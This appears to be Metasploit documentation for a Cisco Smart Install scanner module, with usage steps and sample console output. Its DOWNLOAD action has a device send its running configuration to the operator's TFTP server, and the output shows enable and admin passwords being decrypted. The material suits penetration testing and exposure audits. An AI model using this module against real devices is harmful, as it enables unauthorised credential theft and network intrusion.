## Vulnerable Application

  Any system exposing the Cisco Smart Install (SMI) protocol, which typically runs on TCP port 4786.

## Verification Steps

  1. Do: ```use auxiliary/scanner/misc/cisco_smart_install```
  2. Do: ```set ACTION SCAN```
  3. Do: ```set [RHOSTS]```, replacing ```[RHOSTS]``` with a list of hosts to test for the presence of SMI
  3. Do: ```run```
  4. If the host is exposing an identifiable SMI instance, it will print the endpoint.

## Options

### SLEEP
Time to wait for connection back from target. Default is `60` seconds if using `DOWNLOAD` action

### LHOST
Address to bind to for TFTP server to accept connections if using `DOWNLOAD` action

## Actions
There are two actions, default being ```SCAN```

  1. **SCAN** - Scan for Smart Install endpoints. [Default]
  2. **DOWNLOAD** - Request devices configuration and send to our TFTP server

## Scenarios

Using the default `SCAN` action
  ```
msf auxiliary(cisco_smart_install) > run

[*] Scanned  57 of 512 hosts (11% complete)
[*] Scanned 105 of 512 hosts (20% complete)
[*] Scanned 157 of 512 hosts (30% complete)
[*] Scanned 212 of 512 hosts (41% complete)
[*] Scanned 256 of 512 hosts (50% complete)
[*] Scanned 310 of 512 hosts (60% complete)
[*] Scanned 368 of 512 hosts (71% complete)
[*] Scanned 413 of 512 hosts (80% complete)
[*] Scanned 466 of 512 hosts (91% complete)
[+] a.b.c.d:4786   - Fingerprinted the Cisco Smart Install protocol
[*] Scanned 512 of 512 hosts (100% complete)
[*] Auxiliary module execution completed
```

Using the `DOWNLOAD` action

  ```
[*] 192.168.0.26:4786      - Starting TFTP Server...
[+] 192.168.0.26:4786      - Fingerprinted the Cisco Smart Install protocol
[*] 192.168.0.26:4786      - Attempting copy system:running-config tftp://192.168.0.11/kWqjngYF
[*] 192.168.0.26:4786      - Waiting 60 seconds for configuration
[*] 192.168.0.26:4786      - Incoming file from 192.168.0.26 - kWqjngYF (31036 bytes)
[+] 192.168.0.26:4786      - 192.168.0.26:4786 Decrypted Enable Password: testcase
[+] 192.168.0.26:4786      - 192.168.0.26:4786 Username 'admin' with Decrypted Password: testcase)
[*] 192.168.0.26:4786      - Providing some time for transfers to complete...
[*] 192.168.0.26:4786      - Shutting down the TFTP service...
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
